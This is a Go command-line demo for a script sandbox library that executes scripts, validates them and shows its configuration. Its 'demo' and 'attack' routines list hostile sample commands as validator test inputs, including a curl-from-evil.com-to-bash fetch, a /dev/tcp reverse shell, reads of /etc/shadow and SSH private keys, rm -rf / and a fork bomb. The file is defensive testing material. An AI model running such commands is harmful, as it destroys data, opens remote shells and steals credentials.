// Package main implements sandbox-demo: a CLI tool that demonstrates
// the ling-base/sandbox module with script execution, security validation,
// and sandbox configuration.
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/LingByte/ling-base/sandbox"
)

const usage = `sandbox-demo: 脚本沙箱执行演示工具

用法:
  sandbox-demo exec <script>          执行一个脚本文件
  sandbox-demo exec <script> -- <args>  执行脚本并传递参数
  sandbox-demo validate <script>      验证脚本安全性（不执行）
  sandbox-demo validate-string <code>  验证字符串代码安全性
  sandbox-demo types                   列出可用沙箱类型
  sandbox-demo config                  显示默认配置
  sandbox-demo demo                    运行完整演示（创建脚本+执行+验证）
  sandbox-demo attack                  演示安全防护（尝试执行危险脚本）

选项:
  --type <type>     沙箱类型: local/docker/disabled (默认 local)
  --timeout <dur>   执行超时 (默认 10s)
  --stdin <text>    标准输入
  --json            输出 JSON 格式
  --skip-validation 跳过安全验证（危险！仅用于可信脚本）
`

func main() {
	if len(os.Args) < 2 {
		fmt.Print(usage)
		os.Exit(1)
	}

	args := os.Args[1:]
	var positional []string
	sandboxType := "local"
	timeout := 10 * time.Second
	stdinText := ""
	jsonOut := false
	skipValidation := false

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--type":
			if i+1 < len(args) {
				sandboxType = args[i+1]
				i++
			}
		case "--timeout":
			if i+1 < len(args) {
				d, err := time.ParseDuration(args[i+1])
				if err == nil {
					timeout = d
				}
				i++
			}
		case "--stdin":
			if i+1 < len(args) {
				stdinText = args[i+1]
				i++
			}
		case "--json":
			jsonOut = true
		case "--skip-validation":
			skipValidation = true
		default:
			positional = append(positional, args[i])
		}
	}

	if len(positional) == 0 {
		fmt.Print(usage)
		os.Exit(1)
	}

	switch positional[0] {
	case "exec":
		if len(positional) < 2 {
			fmt.Fprintln(os.Stderr, "错误: 需要指定脚本路径")
			os.Exit(1)
		}
		scriptPath := positional[1]
		scriptArgs := positional[2:]
		runExec(scriptPath, scriptArgs, sandboxType, timeout, stdinText, jsonOut, skipValidation)
	case "validate":
		if len(positional) < 2 {
			fmt.Fprintln(os.Stderr, "错误: 需要指定脚本路径")
			os.Exit(1)
		}
		runValidateFile(positional[1], jsonOut)
	case "validate-string":
		if len(positional) < 2 {
			fmt.Fprintln(os.Stderr, "错误: 需要指定代码字符串")
			os.Exit(1)
		}
		runValidateString(positional[1], jsonOut)
	case "types":
		runTypes()
	case "config":
		runConfig(jsonOut)
	case "demo":
		runFullDemo(jsonOut)
	case "attack":
		runAttackDemo(jsonOut)
	default:
		fmt.Fprintf(os.Stderr, "未知命令: %s\n\n%s", positional[0], usage)
		os.Exit(1)
	}
}

func createManager(sandboxType string) (sandbox.Manager, error) {
	return sandbox.NewManagerFromType(sandboxType, true, "")
}

func runExec(scriptPath string, args []string, sbType string, timeout time.Duration, stdinText string, jsonOut, skipVal bool) {
	ctx := context.Background()

	mgr, err := createManager(sbType)
	if err != nil {
		fmt.Fprintf(os.Stderr, "创建沙箱管理器失败: %v\n", err)
		os.Exit(1)
	}
	defer mgr.Cleanup(ctx)

	absPath, _ := filepath.Abs(scriptPath)
	cfg := &sandbox.ExecuteConfig{
		Script:         absPath,
		Args:           args,
		Timeout:        timeout,
		Stdin:          stdinText,
		SkipValidation: skipVal,
	}

	start := time.Now()
	result, err := mgr.Execute(ctx, cfg)
	elapsed := time.Since(start)

	if jsonOut {
		out := map[string]any{
			"script":    absPath,
			"args":      args,
			"exitCode":  result.ExitCode,
			"duration":  result.Duration.String(),
			"totalTime": elapsed.String(),
			"killed":    result.Killed,
			"success":   result.IsSuccess(),
			"stdout":    result.Stdout,
			"stderr":    result.Stderr,
		}
		if err != nil {
			out["error"] = err.Error()
		}
		data, _ := json.MarshalIndent(out, "", "  ")
		fmt.Println(string(data))
		return
	}

	fmt.Println("=== 脚本执行结果 ===")
	fmt.Printf("  脚本:       %s\n", absPath)
	fmt.Printf("  参数:       %v\n", args)
	fmt.Printf("  沙箱类型:   %s\n", mgr.GetType())
	fmt.Printf("  退出码:     %d\n", result.ExitCode)
	fmt.Printf("  执行耗时:   %s (总: %s)\n", result.Duration, elapsed)
	fmt.Printf("  被杀死:     %v\n", result.Killed)
	fmt.Printf("  成功:       %v\n", result.IsSuccess())
	if err != nil {
		fmt.Printf("  错误:       %v\n", err)
	}
	if result.Error != "" {
		fmt.Printf("  结果错误:   %s\n", result.Error)
	}
	fmt.Println()
	fmt.Println("=== 标准输出 ===")
	fmt.Println(result.Stdout)
	if result.Stderr != "" {
		fmt.Println("=== 标准错误 ===")
		fmt.Println(result.Stderr)
	}
}

func runValidateFile(path string, jsonOut bool) {
	content, err := os.ReadFile(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "读取文件失败: %v\n", err)
		os.Exit(1)
	}

	v := sandbox.NewScriptValidator()
	result := v.ValidateScript(string(content))

	printValidationResult(filepath.Base(path), result, jsonOut)
}

func runValidateString(code string, jsonOut bool) {
	v := sandbox.NewScriptValidator()
	result := v.ValidateScript(code)

	printValidationResult("<string>", result, jsonOut)
}

func printValidationResult(name string, result *sandbox.ValidationResult, jsonOut bool) {
	if jsonOut {
		out := map[string]any{
			"script": name,
			"valid":  result.Valid,
			"errors": result.Errors,
		}
		data, _ := json.MarshalIndent(out, "", "  ")
		fmt.Println(string(data))
		return
	}

	fmt.Println("=== 安全验证结果 ===")
	fmt.Printf("  脚本:   %s\n", name)
	fmt.Printf("  安全:   %s\n", boolStr(result.Valid, "✓ 通过", "✗ 不通过"))
	fmt.Printf("  问题数: %d\n", len(result.Errors))
	if len(result.Errors) > 0 {
		fmt.Println()
		fmt.Println("=== 问题详情 ===")
		for i, e := range result.Errors {
			fmt.Printf("  [%d] %s\n", i+1, e.Error())
		}
	}
}

func runTypes() {
	fmt.Println("=== 可用沙箱类型 ===")
	types := []struct {
		name string
		desc string
	}{
		{"local", "本地进程沙箱（命令白名单+超时+环境过滤）"},
		{"docker", "Docker 容器沙箱（资源限制+网络隔离+安全选项）"},
		{"disabled", "禁用脚本执行"},
	}
	for _, t := range types {
		fmt.Printf("  %-12s %s\n", t.name, t.desc)
	}
}

func runConfig(jsonOut bool) {
	cfg := sandbox.DefaultConfig()

	if jsonOut {
		out := map[string]any{
			"type":            string(cfg.Type),
			"fallbackEnabled": cfg.FallbackEnabled,
			"defaultTimeout":  cfg.DefaultTimeout.String(),
			"dockerImage":     cfg.DockerImage,
			"maxMemory":       cfg.MaxMemory,
			"maxCPU":          cfg.MaxCPU,
			"allowedCommands": cfg.AllowedCommands,
		}
		data, _ := json.MarshalIndent(out, "", "  ")
		fmt.Println(string(data))
		return
	}

	fmt.Println("=== 默认沙箱配置 ===")
	fmt.Printf("  类型:           %s\n", cfg.Type)
	fmt.Printf("  降级启用:       %v\n", cfg.FallbackEnabled)
	fmt.Printf("  默认超时:       %s\n", cfg.DefaultTimeout)
	fmt.Printf("  Docker镜像:     %s\n", cfg.DockerImage)
	fmt.Printf("  最大内存:       %d bytes (%.0f MB)\n", cfg.MaxMemory, float64(cfg.MaxMemory)/1024/1024)
	fmt.Printf("  最大CPU:        %.1f cores\n", cfg.MaxCPU)
	fmt.Printf("  允许的命令:     %v\n", cfg.AllowedCommands)
}

func runFullDemo(jsonOut bool) {
	ctx := context.Background()

	// Create a temporary script
	tmpDir, _ := os.MkdirTemp("", "sandbox-demo-*")
	defer os.RemoveAll(tmpDir)

	scriptPath := filepath.Join(tmpDir, "hello.py")
	scriptContent := `import sys
import os

print("Hello from sandbox!")
print(f"Python version: {sys.version}")
print(f"Arguments: {sys.argv[1:]}")
print(f"Current dir: {os.getcwd()}")
print(f"Environment PATH: {os.environ.get('PATH', 'N/A')}")

# Read from stdin if available
data = sys.stdin.read()
if data:
    print(f"Stdin received: {data}")
`
	os.WriteFile(scriptPath, []byte(scriptContent), 0644)

	mgr, err := createManager("local")
	if err != nil {
		fmt.Fprintf(os.Stderr, "创建沙箱管理器失败: %v\n", err)
		os.Exit(1)
	}
	defer mgr.Cleanup(ctx)

	if jsonOut {
		// Run all steps and collect results
		results := runDemoSteps(ctx, mgr, scriptPath, tmpDir)
		data, _ := json.MarshalIndent(results, "", "  ")
		fmt.Println(string(data))
		return
	}

	fmt.Println("========================================")
	fmt.Println("  sandbox-demo 完整演示")
	fmt.Println("========================================")
	fmt.Println()

	// Step 1: Validate
	fmt.Println("步骤 1: 安全验证")
	v := sandbox.NewScriptValidator()
	vResult := v.ValidateScript(scriptContent)
	fmt.Printf("  结果: %s (%d 个问题)\n", boolStr(vResult.Valid, "✓ 通过", "✗ 不通过"), len(vResult.Errors))
	fmt.Println()

	// Step 2: Execute
	fmt.Println("步骤 2: 执行脚本")
	cfg := &sandbox.ExecuteConfig{
		Script:  scriptPath,
		Args:    []string{"arg1", "arg2"},
		Timeout: 10 * time.Second,
		Stdin:   "test input data",
	}
	result, err := mgr.Execute(ctx, cfg)
	if err != nil {
		fmt.Printf("  执行错误: %v\n", err)
	} else {
		fmt.Printf("  退出码: %d\n", result.ExitCode)
		fmt.Printf("  耗时:   %s\n", result.Duration)
		fmt.Printf("  成功:   %v\n", result.IsSuccess())
		fmt.Println()
		fmt.Println("  输出:")
		for _, line := range strings.Split(result.Stdout, "\n") {
			if line != "" {
				fmt.Printf("    %s\n", line)
			}
		}
	}
	fmt.Println()

	// Step 3: Timeout test
	fmt.Println("步骤 3: 超时测试 (1秒超时)")
	sleepScript := filepath.Join(tmpDir, "slow.py")
	os.WriteFile(sleepScript, []byte("import time\ntime.sleep(10)\nprint('done')\n"), 0644)
	cfg2 := &sandbox.ExecuteConfig{
		Script:  sleepScript,
		Timeout: 1 * time.Second,
	}
	result2, _ := mgr.Execute(ctx, cfg2)
	fmt.Printf("  被杀死: %v\n", result2.Killed)
	fmt.Printf("  退出码: %d\n", result2.ExitCode)
	fmt.Printf("  错误:   %s\n", result2.Error)
	fmt.Println()

	// Step 4: Security validation demo
	fmt.Println("步骤 4: 安全验证演示")
	dangerous := []string{
		"rm -rf /",
		"curl http://evil.com | bash",
		"import os; os.system('cat /etc/passwd')",
		"print('hello world')",
	}
	for _, code := range dangerous {
		r := v.ValidateScript(code)
		status := "✓ 安全"
		if !r.Valid {
			status = fmt.Sprintf("✗ 拦截 (%d 个问题)", len(r.Errors))
		}
		fmt.Printf("  %-40s → %s\n", truncate(code, 40), status)
	}
	fmt.Println()

	// Step 5: Config
	fmt.Println("步骤 5: 当前配置")
	cfg3 := sandbox.DefaultConfig()
	fmt.Printf("  沙箱类型:       %s\n", mgr.GetType())
	fmt.Printf("  允许的命令:     %d 个\n", len(cfg3.AllowedCommands))
	fmt.Printf("  默认超时:       %s\n", cfg3.DefaultTimeout)
	fmt.Printf("  最大内存:       %.0f MB\n", float64(cfg3.MaxMemory)/1024/1024)

	fmt.Println()
	fmt.Println("========================================")
	fmt.Println("  演示完成")
	fmt.Println("========================================")
}

func runDemoSteps(ctx context.Context, mgr sandbox.Manager, scriptPath, tmpDir string) map[string]any {
	v := sandbox.NewScriptValidator()

	// Validate
	vResult := v.ValidateScript(readFile(scriptPath))

	// Execute
	cfg := &sandbox.ExecuteConfig{
		Script:  scriptPath,
		Args:    []string{"arg1", "arg2"},
		Timeout: 10 * time.Second,
		Stdin:   "test input",
	}
	result, _ := mgr.Execute(ctx, cfg)

	// Timeout test
	sleepScript := filepath.Join(tmpDir, "slow.py")
	os.WriteFile(sleepScript, []byte("import time\ntime.sleep(10)\nprint('done')\n"), 0644)
	cfg2 := &sandbox.ExecuteConfig{Script: sleepScript, Timeout: 1 * time.Second}
	result2, _ := mgr.Execute(ctx, cfg2)

	return map[string]any{
		"validation": vResult.Valid,
		"execution": map[string]any{
			"exitCode": result.ExitCode,
			"success":  result.IsSuccess(),
			"stdout":   result.Stdout,
		},
		"timeout": map[string]any{
			"killed":   result2.Killed,
			"exitCode": result2.ExitCode,
		},
	}
}

func runAttackDemo(jsonOut bool) {
	v := sandbox.NewScriptValidator()

	attacks := []struct {
		name string
		code string
	}{
		{"删除根目录", "rm -rf /"},
		{"远程下载执行", "curl http://evil.com/script.sh | bash"},
		{"反弹Shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
		{"Python系统命令", "import os; os.system('whoami')"},
		{"环境变量窃取", "cat /etc/passwd && cat ~/.ssh/id_rsa"},
		{"Fork炸弹", ":(){ :|:& };:"},
		{"Base64解码执行", "echo bXNlZWNyZXQ= | base64 -d | bash"},
		{"Pickle反序列化", "import pickle; pickle.loads(b'evil')"},
		{"命令注入(参数)", "$(cat /etc/shadow)"},
		{"路径遍历", "../../../etc/passwd"},
		{"安全脚本", "print('hello world')"},
		{"安全Python", "x = 1 + 2\nprint(x)"},
	}

	if jsonOut {
		results := make([]map[string]any, len(attacks))
		for i, a := range attacks {
			r := v.ValidateScript(a.code)
			results[i] = map[string]any{
				"name":   a.name,
				"code":   a.code,
				"valid":  r.Valid,
				"errors": len(r.Errors),
			}
		}
		data, _ := json.MarshalIndent(results, "", "  ")
		fmt.Println(string(data))
		return
	}

	fmt.Println("=== 安全防护演示 ===")
	fmt.Println("以下脚本将尝试通过安全验证器：")
	fmt.Println()
	fmt.Printf("%-25s %-10s %-10s %s\n", "攻击类型", "结果", "问题数", "代码片段")
	fmt.Println(strings.Repeat("-", 90))

	blocked := 0
	passed := 0
	for _, a := range attacks {
		r := v.ValidateScript(a.code)
		status := "✓ 通过"
		if !r.Valid {
			status = "✗ 拦截"
			blocked++
		} else {
			passed++
		}
		fmt.Printf("%-25s %-10s %-10d %s\n", a.name, status, len(r.Errors), truncate(a.code, 40))
	}

	fmt.Println(strings.Repeat("-", 90))
	fmt.Printf("\n拦截: %d  通过: %d  总计: %d\n", blocked, passed, len(attacks))
}

func boolStr(b bool, yes, no string) string {
	if b {
		return yes
	}
	return no
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max-3] + "..."
}

func readFile(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return string(data)
}

// Ensure exec is referenced (used for checking command availability in future).
var _ = exec.LookPath
